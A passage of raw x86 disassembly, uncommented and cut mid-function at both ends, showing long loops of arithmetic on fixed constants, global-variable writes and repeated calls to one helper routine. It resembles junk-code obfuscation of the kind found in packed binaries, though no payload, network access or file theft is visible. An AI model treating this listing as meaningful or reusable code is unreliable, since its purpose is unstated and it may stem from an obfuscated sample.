  429b82:	jne    0x429b88
  429b84:	lea    esi,[ecx+ebx*1+0x1f]
  429b88:	movzx  ecx,bl
  429b8b:	add    eax,0x5
  429b8e:	cmp    eax,0xc4f
  429b93:	lea    ecx,[ecx+esi*1+0x4]
  429b97:	jl     0x429b6c
  429b99:	push   0x0
  429b9b:	push   0x5c
  429b9d:	push   edx
  429b9e:	push   edi
  429b9f:	call   0x437b80
  429ba4:	mov    ecx,edx
  429ba6:	mov    edx,DWORD PTR [esp+0x38]
  429baa:	cmp    edx,eax
  429bac:	jne    0x429bb4
  429bae:	xor    eax,eax
  429bb0:	cmp    eax,ecx
  429bb2:	je     0x429bbd
  429bb4:	mov    eax,edx
  429bb6:	sub    eax,edi
  429bb8:	add    eax,0x2e
  429bbb:	jmp    0x429bc1
  429bbd:	lea    eax,[edi+edx*1+0x4]
  429bc1:	movzx  ebp,al
  429bc4:	lea    ecx,[esi+ebp*1-0xe]
  429bc8:	mov    DWORD PTR [esp+0x10],0x9b9
  429bd0:	dec    esi
  429bd1:	je     0x429be6
  429bd3:	sub    esi,0x12
  429bd6:	je     0x429be1
  429bd8:	push   0x5c
  429bda:	pop    esi
  429bdb:	sub    esi,ecx
  429bdd:	mov    ecx,esi
  429bdf:	jmp    0x429bee
  429be1:	lea    ecx,[ebx+0x18]
  429be4:	jmp    0x429bee
  429be6:	movzx  esi,cx
  429be9:	sub    esi,ebx
  429beb:	inc    esi
  429bec:	mov    ebx,esi
  429bee:	lea    esi,[ecx+ebx*1+0x5]
  429bf2:	cmp    ebx,esi
  429bf4:	jne    0x429c0c
  429bf6:	mov    esi,ecx
  429bf8:	imul   esi,esi,0x5c
  429bfb:	cmp    ebx,esi
  429bfd:	je     0x429c08
  429bff:	mov    esi,ebx
  429c01:	sub    esi,ecx
  429c03:	add    esi,0x2e
  429c06:	jmp    0x429c0c
  429c08:	lea    esi,[ecx+ebx*1+0x4]
  429c0c:	lea    edi,[esi+ecx*1+0x32]
  429c10:	cmp    edi,ebx
  429c12:	jne    0x429c18
  429c14:	lea    esi,[ecx+ebx*1+0x1f]
  429c18:	dec    DWORD PTR [esp+0x10]
  429c1c:	jne    0x429bd0
  429c1e:	mov    ecx,DWORD PTR [esp+0x14]
  429c22:	and    DWORD PTR ds:0x43e09c,0x0
  429c29:	lea    edi,[ecx+eax*1+0x4]
  429c2d:	mov    ecx,esi
  429c2f:	dec    ecx
  429c30:	lea    ebp,[esi+ebp*1+0x4]
  429c34:	mov    DWORD PTR ds:0x43e058,ebx
  429c3a:	mov    DWORD PTR ds:0x43e07c,ebp
  429c40:	je     0x429c5b
  429c42:	sub    ecx,0x12
  429c45:	je     0x429c56
  429c47:	push   0x5c
  429c49:	pop    ecx
  429c4a:	sub    ecx,ebp
  429c4c:	mov    ebp,ecx
  429c4e:	mov    DWORD PTR ds:0x43e07c,ebp
  429c54:	jmp    0x429c6d
  429c56:	lea    ebp,[ebx+0x18]
  429c59:	jmp    0x429c4e
  429c5b:	movzx  ecx,bp
  429c5e:	sub    ecx,ebx
  429c60:	inc    ecx
  429c61:	mov    ebx,ecx
  429c63:	mov    DWORD PTR ds:0x43e058,ebx
  429c69:	lea    esi,[ebx+ebp*1+0x1f]
  429c6d:	mov    DWORD PTR [esp+0x14],0x9b9
  429c75:	jmp    0x429c7b
  429c77:	mov    edx,DWORD PTR [esp+0x38]
  429c7b:	mov    ecx,eax
  429c7d:	dec    ecx
  429c7e:	je     0x429cb9
  429c80:	sub    ecx,0x12
  429c83:	je     0x429cad
  429c85:	xor    edx,edx
  429c87:	xor    ebp,ebp
  429c89:	lea    ecx,[eax+0x2e]
  429c8c:	sub    ecx,eax
  429c8e:	sbb    edx,ebp
  429c90:	sub    ecx,edi
  429c92:	sbb    edx,DWORD PTR ds:0x43e09c
  429c98:	add    ecx,0x2e
  429c9b:	adc    edx,ebp
  429c9d:	mov    ebp,DWORD PTR ds:0x43e07c
  429ca3:	mov    edi,ecx
  429ca5:	mov    DWORD PTR ds:0x43e09c,edx
  429cab:	jmp    0x429cc3
  429cad:	and    DWORD PTR ds:0x43e09c,0x0
  429cb4:	lea    edi,[edx+0x18]
  429cb7:	jmp    0x429cc7
  429cb9:	movzx  eax,di
  429cbc:	sub    eax,edx
  429cbe:	inc    eax
  429cbf:	mov    DWORD PTR [esp+0x38],eax
  429cc3:	mov    edx,DWORD PTR [esp+0x38]
  429cc7:	lea    eax,[edi+edx*1]
  429cca:	mov    DWORD PTR [esp+0x10],eax
  429cce:	add    eax,0x5
  429cd1:	cmp    edx,eax
  429cd3:	jne    0x429d03
  429cd5:	push   0x0
  429cd7:	push   0x5c
  429cd9:	push   DWORD PTR ds:0x43e09c
  429cdf:	push   edi
  429ce0:	call   0x437b80
  429ce5:	xor    ecx,ecx
  429ce7:	cmp    DWORD PTR [esp+0x38],eax
  429ceb:	jne    0x429cf1
  429ced:	cmp    ecx,edx
  429cef:	je     0x429cfc
  429cf1:	mov    eax,DWORD PTR [esp+0x38]
  429cf5:	sub    eax,edi
  429cf7:	add    eax,0x2e
  429cfa:	jmp    0x429d03
  429cfc:	mov    eax,DWORD PTR [esp+0x10]
  429d00:	add    eax,0x4
  429d03:	xor    ecx,ecx
  429d05:	mov    DWORD PTR [esp+0x24],eax
  429d09:	add    DWORD PTR [esp+0x24],edi
  429d0d:	mov    edx,DWORD PTR [esp+0x24]
  429d11:	adc    ecx,DWORD PTR ds:0x43e09c
  429d17:	add    edx,0x32
  429d1a:	adc    ecx,0x0
  429d1d:	cmp    edx,DWORD PTR [esp+0x38]
  429d21:	mov    DWORD PTR [esp+0x30],ecx
  429d25:	jne    0x429d36
  429d27:	xor    ecx,ecx
  429d29:	cmp    DWORD PTR [esp+0x30],ecx
  429d2d:	jne    0x429d36
  429d2f:	mov    eax,DWORD PTR [esp+0x10]
  429d33:	add    eax,0x1f
  429d36:	dec    DWORD PTR [esp+0x14]
  429d3a:	jne    0x429c77
  429d40:	add    eax,ebp
  429d42:	lea    esi,[esi+eax*1+0x3ef9]
  429d49:	mov    eax,0x9b9
  429d4e:	dec    esi
  429d4f:	je     0x429d64
  429d51:	sub    esi,0x12
  429d54:	je     0x429d5f
  429d56:	push   0x5c
  429d58:	pop    ecx
  429d59:	sub    ecx,ebp
  429d5b:	mov    ebp,ecx
  429d5d:	jmp    0x429d6c
  429d5f:	lea    ebp,[ebx+0x18]
  429d62:	jmp    0x429d6c
  429d64:	movzx  ecx,bp
  429d67:	sub    ecx,ebx
  429d69:	inc    ecx
  429d6a:	mov    ebx,ecx
  429d6c:	lea    esi,[ebx+ebp*1+0x5]
  429d70:	cmp    ebx,esi
  429d72:	jne    0x429d8a
  429d74:	mov    ecx,ebp
  429d76:	imul   ecx,ecx,0x5c
  429d79:	cmp    ebx,ecx
  429d7b:	je     0x429d86
  429d7d:	mov    esi,ebx
  429d7f:	sub    esi,ebp
  429d81:	add    esi,0x2e
  429d84:	jmp    0x429d8a
  429d86:	lea    esi,[ebx+ebp*1+0x4]
  429d8a:	lea    ecx,[esi+ebp*1+0x32]
  429d8e:	cmp    ecx,ebx
  429d90:	jne    0x429d96
  429d92:	lea    esi,[ebx+ebp*1+0x1f]
  429d96:	dec    eax
  429d97:	jne    0x429d4e
  429d99:	mov    DWORD PTR ds:0x43e058,ebx
  429d9f:	mov    DWORD PTR [esp+0x10],0x3c
  429da7:	mov    edx,DWORD PTR [esp+0x38]
  429dab:	cmp    edx,edi
  429dad:	jne    0x429db9
  429daf:	xor    eax,eax
  429db1:	cmp    eax,DWORD PTR ds:0x43e09c
  429db7:	je     0x429e0b
  429db9:	lea    eax,[edi+edx*1+0x5]
  429dbd:	cmp    eax,0x39b
  429dc2:	je     0x429e0b
  429dc4:	xor    ecx,ecx
  429dc6:	mov    esi,eax
  429dc8:	add    esi,edi
  429dca:	adc    ecx,DWORD PTR ds:0x43e09c
  429dd0:	add    esi,0x32
  429dd3:	adc    ecx,0x0
  429dd6:	cmp    esi,edx
  429dd8:	jne    0x429dea
  429dda:	xor    edx,edx
  429ddc:	cmp    ecx,edx
  429dde:	jne    0x429dea
  429de0:	mov    edx,DWORD PTR [esp+0x38]
  429de4:	lea    eax,[edi+edx*1+0x1f]
  429de8:	jmp    0x429dee
  429dea:	mov    edx,DWORD PTR [esp+0x38]
  429dee:	add    DWORD PTR [esp+0x10],0x5
  429df3:	and    DWORD PTR ds:0x43e09c,0x0
  429dfa:	cmp    DWORD PTR [esp+0x10],0xc4f
  429e02:	movzx  ecx,dl
  429e05:	lea    edi,[ecx+eax*1+0x4]
  429e09:	jl     0x429da7
  429e0b:	mov    eax,ebp
  429e0d:	imul   eax,eax,0x5c
  429e10:	lea    ecx,[edi+edx*1]
  429e13:	mov    DWORD PTR [esp+0x10],ecx
  429e17:	add    ecx,0x1f
  429e1a:	cmp    ebx,eax
  429e1c:	je     0x429e27
  429e1e:	mov    eax,ebx
  429e20:	sub    eax,ebp
  429e22:	add    eax,0x2e
  429e25:	jmp    0x429e2b
  429e27:	lea    eax,[ebx+ebp*1+0x4]
  429e2b:	movzx  edx,cl
  429e2e:	lea    eax,[edx+eax*1-0xe]
  429e32:	mov    edx,eax
  429e34:	imul   edx,edx,0x5c
  429e37:	cmp    ebx,edx
  429e39:	je     0x429e44
  429e3b:	mov    ebp,ebx
  429e3d:	sub    ebp,eax
  429e3f:	add    ebp,0x2e
  429e42:	jmp    0x429e48
  429e44:	lea    ebp,[eax+ebx*1+0x4]
  429e48:	push   0x48
  429e4a:	xor    edx,edx
  429e4c:	mov    eax,ecx
  429e4e:	pop    esi
  429e4f:	div    esi
  429e51:	cmp    eax,0x65
  429e54:	jbe    0x429e63
  429e56:	mov    eax,DWORD PTR [esp+0x38]
  429e5a:	add    edi,eax
  429e5c:	lea    ecx,[ecx+edi*1+0x3ef9]
  429e63:	mov    esi,DWORD PTR [esp+0x10]
  429e67:	movzx  eax,cl
  429e6a:	add    esi,0x4
  429e6d:	lea    eax,[eax+ebp*1-0xe]
  429e71:	mov    edi,esi
  429e73:	sub    edi,eax
  429e75:	sub    edi,0x3222
  429e7b:	lea    eax,[esi+edi*1+0x5]
  429e7f:	push   0x48
  429e81:	xor    edx,edx
  429e83:	pop    ebp
  429e84:	mov    ds:0x43e094,eax
  429e89:	div    ebp
  429e8b:	movzx  ecx,BYTE PTR [esp+0x38]
  429e90:	mov    DWORD PTR [esp+0x14],ecx
  429e94:	lea    ecx,[ecx+esi*1-0xe]
  429e98:	cmp    eax,0x65
  429e9b:	jbe    0x429eaf
  429e9d:	mov    edx,DWORD PTR ds:0x43e094
  429ea3:	lea    eax,[edi+ebx*1]
  429ea6:	lea    eax,[edx+eax*1+0x3ef9]
  429ead:	jmp    0x429eb4
  429eaf:	mov    eax,ds:0x43e094
  429eb4:	movzx  edx,si
  429eb7:	mov    esi,DWORD PTR [esp+0x38]
  429ebb:	sub    edx,edi
  429ebd:	add    edx,eax
  429ebf:	mov    edi,edx
  429ec1:	imul   edi,edi,0x5c
  429ec4:	cmp    ebx,edi
  429ec6:	lea    eax,[ecx+esi*1+0x1f]
  429eca:	je     0x429ed5
  429ecc:	mov    edi,ebx
  429ece:	sub    edi,edx
  429ed0:	add    edi,0x2e
  429ed3:	jmp    0x429ed9
  429ed5:	lea    edi,[edx+ebx*1+0x4]
  429ed9:	mov    DWORD PTR ds:0x43e094,edi
  429edf:	lea    edi,[eax+esi*1-0x32]
  429ee3:	cmp    edi,0x23e
  429ee9:	jb     0x429ef2
  429eeb:	mov    ecx,esi
  429eed:	sub    ecx,eax
  429eef:	add    ecx,0x2e
  429ef2:	sub    eax,edx
  429ef4:	sub    eax,0x3222
  429ef9:	xor    ebp,ebp
  429efb:	mov    edi,eax
  429efd:	add    esi,0xffffcdde
  429f03:	push   ebp
  429f04:	sub    esi,ecx
  429f06:	pop    eax
  429f07:	sbb    ebp,eax
  429f09:	mov    eax,ds:0x43e094
  429f0e:	lea    eax,[eax+ebx*1-0x32]
  429f12:	cmp    eax,0x23e
  429f17:	jb     0x429f24
  429f19:	mov    edi,ebx
  429f1b:	sub    edi,DWORD PTR ds:0x43e094
  429f21:	add    edi,0x2e
  429f24:	mov    eax,ds:0x43e094
  429f29:	dec    eax
  429f2a:	je     0x429f3f
  429f2c:	sub    eax,0x12
  429f2f:	je     0x429f3a
  429f31:	push   0x5c
  429f33:	pop    eax
  429f34:	sub    eax,edi
  429f36:	mov    edi,eax
  429f38:	jmp    0x429f4d
  429f3a:	lea    edi,[ebx+0x18]
  429f3d:	jmp    0x429f4d
  429f3f:	movzx  eax,di
  429f42:	sub    eax,ebx
  429f44:	inc    eax
  429f45:	mov    ebx,eax
  429f47:	mov    DWORD PTR ds:0x43e058,ebx
  429f4d:	push   0x0
  429f4f:	push   0x5c
  429f51:	push   ebp
  429f52:	push   esi
  429f53:	call   0x437b80
  429f58:	cmp    DWORD PTR [esp+0x38],eax
  429f5c:	jne    0x429f64
  429f5e:	xor    eax,eax
  429f60:	cmp    eax,edx
  429f62:	je     0x429f6f
  429f64:	mov    ecx,DWORD PTR [esp+0x38]
  429f68:	sub    ecx,esi
  429f6a:	add    ecx,0x2e
  429f6d:	jmp    0x429f77
  429f6f:	mov    eax,DWORD PTR [esp+0x38]
  429f73:	lea    ecx,[esi+eax*1+0x4]
  429f77:	movzx  eax,WORD PTR [esp+0x38]
  429f7c:	and    DWORD PTR [esp+0x20],0x0
  429f81:	cdq    
  429f82:	sub    eax,esi
  429f84:	sbb    edx,ebp
  429f86:	add    eax,ecx
  429f88:	adc    edx,DWORD PTR [esp+0x20]
  429f8c:	mov    DWORD PTR [esp+0x10],0x3c
  429f94:	cmp    ebx,edi
  429f96:	je     0x429fc6
  429f98:	lea    esi,[edi+ebx*1+0x5]
  429f9c:	cmp    esi,0x39b
  429fa2:	je     0x429fc6
  429fa4:	lea    ebp,[esi+edi*1+0x32]
  429fa8:	cmp    ebp,ebx
  429faa:	jne    0x429fb0
  429fac:	lea    esi,[edi+ebx*1+0x1f]
  429fb0:	add    DWORD PTR [esp+0x10],0x5
  429fb5:	cmp    DWORD PTR [esp+0x10],0xc4f
  429fbd:	movzx  edi,bl
  429fc0:	lea    edi,[edi+esi*1+0x4]
  429fc4:	jl     0x429f94
  429fc6:	mov    ebx,DWORD PTR [esp+0x20]
  429fca:	mov    esi,ecx
  429fcc:	add    esi,eax
  429fce:	adc    ebx,edx
  429fd0:	mov    edx,DWORD PTR [esp+0x38]
  429fd4:	add    esi,0x32
  429fd7:	adc    ebx,0x0
  429fda:	cmp    esi,edx
  429fdc:	pop    ebp
  429fdd:	jne    0x429fe9
  429fdf:	xor    esi,esi
  429fe1:	cmp    ebx,esi
  429fe3:	jne    0x429fe9
  429fe5:	lea    ecx,[eax+edx*1+0x1f]
  429fe9:	mov    eax,DWORD PTR [esp+0x10]
  429fed:	lea    esi,[eax+ecx*1-0xe]
  429ff1:	xor    eax,eax
  429ff3:	push   eax
  429ff4:	push   0x5c
  429ff6:	push   eax
  429ff7:	push   esi
  429ff8:	mov    DWORD PTR ds:0x43e098,esi
  429ffe:	mov    ds:0x43e09c,eax
  42a003:	call   0x437b80
  42a008:	mov    ecx,DWORD PTR [esp+0x34]
  42a00c:	cmp    ecx,eax
  42a00e:	jne    0x42a016
  42a010:	xor    eax,eax
  42a012:	cmp    eax,edx
  42a014:	je     0x42a01d
  42a016:	sub    ecx,esi
  42a018:	add    ecx,0x2e
  42a01b:	jmp    0x42a021
  42a01d:	lea    ecx,[esi+ecx*1+0x4]
  42a021:	lea    eax,[ecx+edi*1+0x5]
  42a025:	mov    DWORD PTR ds:0x43e05c,ecx
  42a02b:	sub    ecx,edi
  42a02d:	pop    edi
  42a02e:	sub    ecx,0x3222
  42a034:	pop    esi
  42a035:	mov    ds:0x43e094,eax
  42a03a:	mov    DWORD PTR ds:0x43e07c,ecx
  42a040:	pop    ebx
  42a041:	add    esp,0x24
  42a044:	ret    
  42a045:	mov    ecx,DWORD PTR ds:0x43e094
  42a04b:	sub    esp,0x10
  42a04e:	push   ebx
  42a04f:	push   esi
  42a050:	mov    esi,DWORD PTR ds:0x43e058
  42a056:	mov    ebx,eax
  42a058:	push   edi
  42a059:	xor    edi,edi
  42a05b:	lea    eax,[ebx-0x3222]
  42a061:	sub    eax,DWORD PTR ds:0x43e098
  42a067:	lea    edx,[esi+ecx*1-0x32]
  42a06b:	sbb    edi,DWORD PTR ds:0x43e09c
  42a071:	cmp    edx,0x23e
  42a077:	jb     0x42a080
  42a079:	sub    esi,ecx
  42a07b:	add    esi,0x2e
  42a07e:	jmp    0x42a086
  42a080:	mov    esi,DWORD PTR ds:0x43e07c
  42a086:	mov    ecx,DWORD PTR ds:0x43e05c
  42a08c:	mov    DWORD PTR [esp+0xc],0x3c
  42a094:	push   ebp
  42a095:	cmp    ebx,eax
  42a097:	jne    0x42a09f
  42a099:	xor    edx,edx
  42a09b:	cmp    edx,edi
  42a09d:	je     0x42a0df
  42a09f:	lea    ecx,[eax+ebx*1+0x5]
  42a0a3:	cmp    ecx,0x39b
  42a0a9:	je     0x42a0df
  42a0ab:	xor    ebp,ebp
  42a0ad:	mov    edx,ecx
  42a0af:	add    edx,eax
  42a0b1:	adc    ebp,edi
  42a0b3:	push   0x0
  42a0b5:	add    edx,0x32
  42a0b8:	pop    edi
  42a0b9:	adc    ebp,edi
  42a0bb:	cmp    edx,ebx
  42a0bd:	jne    0x42a0c9
  42a0bf:	xor    edx,edx
  42a0c1:	cmp    ebp,edx
  42a0c3:	jne    0x42a0c9
  42a0c5:	lea    ecx,[eax+ebx*1+0x1f]
  42a0c9:	add    DWORD PTR [esp+0x10],0x5
  42a0ce:	cmp    DWORD PTR [esp+0x10],0xc4f
  42a0d6:	movzx  eax,bl
  42a0d9:	lea    eax,[eax+ecx*1+0x4]
  42a0dd:	jl     0x42a095
  42a0df:	lea    edx,[ecx+esi*1+0x5]
  42a0e3:	lea    ebp,[esi+edx*1+0x32]
  42a0e7:	cmp    ebp,DWORD PTR ds:0x43e058
  42a0ed:	mov    DWORD PTR ds:0x43e094,edx
  42a0f3:	lea    ecx,[eax+ebx*1+0x4]
  42a0f7:	jne    0x42a109
  42a0f9:	mov    edx,DWORD PTR ds:0x43e058
  42a0ff:	lea    edx,[esi+edx*1+0x1f]
  42a103:	mov    DWORD PTR ds:0x43e094,edx
  42a109:	movzx  esi,cl
  42a10c:	lea    esi,[esi+edx*1+0x4]
  42a110:	xor    edx,edx
  42a112:	mov    ebp,ecx
  42a114:	sub    ebp,eax
  42a116:	sbb    edx,edi
  42a118:	movzx  eax,bx
  42a11b:	mov    DWORD PTR [esp+0x14],edx
  42a11f:	cdq    
  42a120:	add    ebp,eax
  42a122:	mov    eax,DWORD PTR [esp+0x14]
  42a126:	adc    eax,edx
  42a128:	mov    ds:0x43e09c,eax
  42a12d:	mov    eax,ds:0x43e094
  42a132:	push   0x48
  42a134:	xor    edx,edx
  42a136:	pop    edi
  42a137:	div    edi
  42a139:	cmp    eax,0x65
  42a13c:	jbe    0x42a157
  42a13e:	mov    eax,ds:0x43e058
  42a143:	mov    edx,DWORD PTR ds:0x43e094
  42a149:	add    eax,esi
  42a14b:	lea    eax,[edx+eax*1+0x3ef9]
  42a152:	mov    ds:0x43e094,eax
  42a157:	push   0x48
  42a159:	xor    edx,edx
  42a15b:	mov    eax,ecx
  42a15d:	pop    edi
  42a15e:	div    edi
  42a160:	cmp    eax,0x65
  42a163:	jbe    0x42a16e
  42a165:	add    ebp,ebx
  42a167:	lea    ecx,[ecx+ebp*1+0x3ef9]
  42a16e:	mov    edx,DWORD PTR ds:0x43e094
  42a174:	and    DWORD PTR ds:0x43e09c,0x0
  42a17b:	lea    eax,[ecx+esi*1]
  42a17e:	lea    eax,[edx+eax*1+0x3ef9]
  42a185:	movzx  edx,bl
  42a188:	lea    edi,[edx+ecx*1+0x4]
  42a18c:	mov    DWORD PTR [esp+0x14],0x9b9
  42a194:	dec    eax
  42a195:	je     0x42a1b0
  42a197:	sub    eax,0x12
  42a19a:	mov    edx,DWORD PTR ds:0x43e058
  42a1a0:	je     0x42a1ab
  42a1a2:	push   0x5c
  42a1a4:	pop    eax
  42a1a5:	sub    eax,esi
  42a1a7:	mov    esi,eax
  42a1a9:	jmp    0x42a1c1
  42a1ab:	lea    esi,[edx+0x18]
  42a1ae:	jmp    0x42a1c1
  42a1b0:	movzx  eax,si
  42a1b3:	sub    eax,DWORD PTR ds:0x43e058
  42a1b9:	inc    eax
  42a1ba:	mov    ds:0x43e058,eax
  42a1bf:	mov    edx,eax
  42a1c1:	lea    ebp,[esi+edx*1]
  42a1c4:	lea    eax,[ebp+0x5]
  42a1c7:	cmp    edx,eax
  42a1c9:	mov    DWORD PTR [esp+0x10],ebp
  42a1cd:	jne    0x42a1e4
  42a1cf:	mov    eax,esi
  42a1d1:	imul   eax,eax,0x5c
  42a1d4:	cmp    edx,eax
  42a1d6:	je     0x42a1e1
  42a1d8:	mov    eax,edx
  42a1da:	sub    eax,esi
  42a1dc:	add    eax,0x2e
  42a1df:	jmp    0x42a1e4
  42a1e1:	lea    eax,[ebp+0x4]
  42a1e4:	lea    ebp,[esi+eax*1+0x32]
  42a1e8:	cmp    ebp,edx
  42a1ea:	jne    0x42a1f3
  42a1ec:	mov    eax,DWORD PTR [esp+0x10]
  42a1f0:	add    eax,0x1f
  42a1f3:	dec    DWORD PTR [esp+0x14]
  42a1f7:	jne    0x42a194
  42a1f9:	mov    eax,ecx
  42a1fb:	dec    eax
  42a1fc:	jne    0x42a20a
  42a1fe:	movzx  eax,di
  42a201:	sub    eax,ebx
  42a203:	inc    eax
  42a204:	mov    ebx,eax
  42a206:	lea    ecx,[edi+ebx*1+0x1f]
  42a20a:	movzx  ebp,bl
  42a20d:	lea    edi,[ecx+esi*1+0x1f]
  42a211:	lea    ebp,[ecx+ebp*1+0x4]
  42a215:	mov    ecx,DWORD PTR ds:0x43e058
  42a21b:	lea    edx,[esi+edi*1+0x32]
  42a21f:	xor    eax,eax
  42a221:	cmp    edx,ecx
  42a223:	jne    0x42a229
  42a225:	lea    edi,[esi+ecx*1+0x1f]
  42a229:	push   0x0
  42a22b:	push   0x5c
  42a22d:	push   eax
  42a22e:	push   ebp
  42a22f:	call   0x437b80
  42a234:	xor    ecx,ecx
  42a236:	cmp    ebx,eax
  42a238:	jne    0x42a23e
  42a23a:	cmp    ecx,edx
  42a23c:	je     0x42a247
  42a23e:	mov    ecx,ebx
  42a240:	sub    ecx,ebp
  42a242:	add    ecx,0x2e
  42a245:	jmp    0x42a24b
  42a247:	lea    ecx,[ebx+ebp*1+0x4]
  42a24b:	lea    eax,[ecx+esi*1]
  42a24e:	lea    eax,[edi+eax*1+0x3ef9]
  42a255:	movzx  edx,bl
  42a258:	mov    edi,eax
  42a25a:	dec    edi
  42a25b:	lea    edx,[edx+ecx*1-0xe]
  42a25f:	jne    0x42a274
  42a261:	movzx  eax,si
  42a264:	sub    eax,DWORD PTR ds:0x43e058
  42a26a:	inc    eax
  42a26b:	mov    ds:0x43e058,eax
  42a270:	lea    eax,[esi+eax*1+0x1f]
  42a274:	movzx  esi,cl
  42a277:	lea    ebp,[esi+eax*1+0x4]
  42a27b:	mov    esi,DWORD PTR ds:0x43e058
  42a281:	lea    edi,[esi+eax*1-0x32]
  42a285:	cmp    edi,0x23e
  42a28b:	mov    DWORD PTR ds:0x43e07c,ebp
  42a291:	jb     0x42a2a0
  42a293:	mov    ebp,esi
  42a295:	sub    ebp,eax
  42a297:	add    ebp,0x2e
  42a29a:	mov    DWORD PTR ds:0x43e07c,ebp
  42a2a0:	xor    edi,edi
  42a2a2:	push   edi
  42a2a3:	mov    esi,ecx
  42a2a5:	sub    esi,edx
  42a2a7:	pop    eax
  42a2a8:	sbb    edi,eax
  42a2aa:	movzx  eax,bx
  42a2ad:	cdq    
  42a2ae:	add    esi,eax
  42a2b0:	adc    edi,edx
  42a2b2:	mov    eax,ebp
  42a2b4:	imul   eax,eax,0x5c
  42a2b7:	cmp    DWORD PTR ds:0x43e058,eax
  42a2bd:	mov    eax,ds:0x43e058
  42a2c2:	je     0x42a2cb
  42a2c4:	sub    eax,ebp
  42a2c6:	add    eax,0x2e
  42a2c9:	jmp    0x42a2cf
  42a2cb:	lea    eax,[eax+ebp*1+0x4]
  42a2cf:	mov    ds:0x43e094,eax
  42a2d4:	mov    DWORD PTR [esp+0x14],0x9b9
  42a2dc:	mov    eax,ecx
  42a2de:	dec    eax
  42a2df:	je     0x42a30d
  42a2e1:	sub    eax,0x12
  42a2e4:	je     0x42a306
  42a2e6:	xor    edx,edx
  42a2e8:	xor    ebp,ebp
  42a2ea:	lea    eax,[ecx+0x2e]
  42a2ed:	sub    eax,ecx
  42a2ef:	sbb    edx,ebp
  42a2f1:	sub    eax,esi
  42a2f3:	sbb    edx,edi
  42a2f5:	add    eax,0x2e
  42a2f8:	adc    edx,ebp
  42a2fa:	mov    ebp,DWORD PTR ds:0x43e07c
  42a300:	mov    esi,eax
  42a302:	mov    edi,edx
  42a304:	jmp    0x42a315
  42a306:	lea    esi,[ebx+0x18]
  42a309:	xor    edi,edi
  42a30b:	jmp    0x42a315
  42a30d:	movzx  eax,si
  42a310:	sub    eax,ebx
  42a312:	inc    eax
  42a313:	mov    ebx,eax
  42a315:	lea    ecx,[esi+ebx*1+0x5]
  42a319:	cmp    ebx,ecx
  42a31b:	jne    0x42a33f
  42a31d:	push   0x0
  42a31f:	push   0x5c
  42a321:	push   edi
  42a322:	push   esi
  42a323:	call   0x437b80
  42a328:	xor    ecx,ecx
  42a32a:	cmp    ebx,eax
  42a32c:	jne    0x42a332
  42a32e:	cmp    ecx,edx
  42a330:	je     0x42a33b
  42a332:	mov    ecx,ebx
  42a334:	sub    ecx,esi
  42a336:	add    ecx,0x2e
  42a339:	jmp    0x42a33f
  42a33b:	lea    ecx,[esi+ebx*1+0x4]
  42a33f:	xor    edx,edx
  42a341:	mov    eax,ecx
  42a343:	add    eax,esi
  42a345:	adc    edx,edi
  42a347:	add    eax,0x32
  42a34a:	adc    edx,0x0
  42a34d:	mov    DWORD PTR [esp+0x1c],edx
  42a351:	xor    edx,edx
  42a353:	cmp    eax,ebx
  42a355:	jne    0x42a361
  42a357:	cmp    DWORD PTR [esp+0x1c],edx
  42a35b:	jne    0x42a361
  42a35d:	lea    ecx,[esi+ebx*1+0x1f]
  42a361:	dec    DWORD PTR [esp+0x14]
  42a365:	jne    0x42a2dc
  42a36b:	mov    eax,ds:0x43e094
  42a370:	add    ecx,ebp
  42a372:	lea    eax,[eax+ecx*1+0x3ef9]
  42a379:	mov    ds:0x43e094,eax
  42a37e:	lea    eax,[esi+ebx*1+0x4]
  42a382:	mov    DWORD PTR [esp+0x14],0x9b9
  42a38a:	mov    ecx,eax
  42a38c:	dec    ecx
  42a38d:	je     0x42a3b5
  42a38f:	sub    ecx,0x12
  42a392:	je     0x42a3ae
  42a394:	xor    edx,edx
  42a396:	xor    ebp,ebp
  42a398:	lea    ecx,[eax+0x2e]
  42a39b:	sub    ecx,eax
  42a39d:	sbb    edx,ebp
  42a39f:	sub    ecx,esi
  42a3a1:	sbb    edx,edi
  42a3a3:	add    ecx,0x2e
  42a3a6:	adc    edx,ebp
  42a3a8:	mov    esi,ecx
  42a3aa:	mov    edi,edx
  42a3ac:	jmp    0x42a3bd
  42a3ae:	lea    esi,[ebx+0x18]
  42a3b1:	xor    edi,edi
  42a3b3:	jmp    0x42a3bd
  42a3b5:	movzx  eax,si
  42a3b8:	sub    eax,ebx
  42a3ba:	inc    eax
  42a3bb:	mov    ebx,eax
  42a3bd:	lea    eax,[esi+ebx*1+0x5]
  42a3c1:	cmp    ebx,eax
  42a3c3:	jne    0x42a3e7
  42a3c5:	push   0x0
  42a3c7:	push   0x5c
  42a3c9:	push   edi
  42a3ca:	push   esi
  42a3cb:	call   0x437b80
  42a3d0:	xor    ecx,ecx
  42a3d2:	cmp    ebx,eax
  42a3d4:	jne    0x42a3da
  42a3d6:	cmp    ecx,edx
  42a3d8:	je     0x42a3e3
  42a3da:	mov    eax,ebx
  42a3dc:	sub    eax,esi
  42a3de:	add    eax,0x2e
  42a3e1:	jmp    0x42a3e7
  42a3e3:	lea    eax,[esi+ebx*1+0x4]
  42a3e7:	xor    edx,edx
  42a3e9:	mov    ecx,eax
  42a3eb:	add    ecx,esi
  42a3ed:	adc    edx,edi
  42a3ef:	add    ecx,0x32
  42a3f2:	adc    edx,0x0
  42a3f5:	xor    ebp,ebp
  42a3f7:	cmp    ecx,ebx
  42a3f9:	jne    0x42a403
  42a3fb:	cmp    edx,ebp
  42a3fd:	jne    0x42a403
  42a3ff:	lea    eax,[esi+ebx*1+0x1f]
  42a403:	dec    DWORD PTR [esp+0x14]
  42a407:	jne    0x42a38a
  42a409:	mov    ecx,DWORD PTR ds:0x43e094
  42a40f:	mov    edx,DWORD PTR ds:0x43e058
  42a415:	movzx  eax,al
  42a418:	lea    ecx,[eax+ecx*1+0x4]
  42a41c:	mov    ebp,ecx
  42a41e:	imul   ebp,ebp,0x5c
  42a421:	cmp    edx,ebp
  42a423:	lea    eax,[esi+ebx*1+0x1f]
  42a427:	je     0x42a430
  42a429:	sub    edx,ecx
  42a42b:	add    edx,0x2e
  42a42e:	jmp    0x42a434
  42a430:	lea    edx,[ecx+edx*1+0x4]
  42a434:	mov    DWORD PTR ds:0x43e094,edx
  42a43a:	mov    DWORD PTR [esp+0x10],0x3c
  42a442:	cmp    ebx,esi
  42a444:	jne    0x42a44c
  42a446:	xor    ebp,ebp
  42a448:	cmp    ebp,edi
  42a44a:	je     0x42a491
  42a44c:	lea    eax,[esi+ebx*1+0x5]
  42a450:	cmp    eax,0x39b
  42a455:	je     0x42a491
